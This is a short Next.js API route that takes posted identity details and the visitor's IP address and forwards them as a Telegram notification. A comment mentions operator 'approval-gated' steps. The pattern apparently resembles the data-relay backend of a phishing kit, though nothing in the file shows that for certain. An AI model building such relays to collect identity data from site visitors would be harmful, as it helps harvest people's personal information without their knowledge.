import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"
import { getClientIp } from "@/lib/request-ip"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const ip = getClientIp(request)
    // The identity-details step is NOT approval-gated (notify only).
    await telegramService.sendVerifyDetailsNotification({ ...data, ip })
    return NextResponse.json({ success: true, token: null })
  } catch (error) {
    console.error("Error sending verify-details notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
